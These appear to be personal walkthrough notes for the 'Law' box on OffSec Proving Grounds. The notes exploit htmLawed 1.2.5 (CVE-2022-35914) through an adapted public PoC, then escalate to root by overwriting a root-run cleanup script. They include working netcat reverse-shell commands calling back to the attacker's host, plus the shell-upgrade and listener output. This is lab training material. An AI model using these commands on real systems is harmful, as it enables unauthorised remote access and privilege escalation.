	`Running all scans on 192.168.231.190`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

![[Pasted image 20240217221211.png]]

Find out we're working with htmlawed 1.2.5

Do the Google search
![[Pasted image 20240217221346.png]]

Check out the cosad3s PoC
https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py

Our htmLawedTest.php is just index.php so we have to edit this a little

On line 37 we need to change /vendor/htmlawed/htmlawed/htmLawedTest.php to /index.php

Try our PoC with a reverse shell
`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Law]`
`└─$ python poc.py -u http://192.168.231.190 -c 'nc 192.168.45.222 4444 -e /bin/bash'`

Catch and upgrade
`└─$ nc -nlvp 4444`
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`
`Ncat: Connection from 192.168.231.190:36172.`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
`www-data@law:/var/www/html$` 

No SUID executables, no sudo -l, no crontab, no other users in /etc/passwd or /home directory.

If we go up 1 directory from the login home, we see some interesting stuff.
`www-data@law:/var/www$ ls`
`ls`
`cleanup.sh  html  local.txt`

Not sure what these do but remember them.
Nothing interesting in linpeas or lse.

If we run pspy for a few minutes, we see root (UID=0) is running the cleanup script.
![[Pasted image 20240217222116.png]]

Replace the cleanup script with a script of our own
`cat cleanup.sh`
`cat cleanup.sh`
`#!/bin/bash`

`nc 192.168.45.222 4445 -e /bin/bash`

Listen and catch the reverse shell
`└─$ nc -nlvp 4445` 
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4445`
`Ncat: Listening on 0.0.0.0:4445`

`Ncat: Connection from 192.168.231.190:49382.`
`whoami`
`root`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
`root@law:~# cd /root`
`cd /root`
`root@law:~# ls`
`ls`
`email3.txt  proof.txt`
`root@law:~# cat proof.txt`
`cat proof.txt`
`b5a5412d6179d87deb0acf6aaec02bb6`
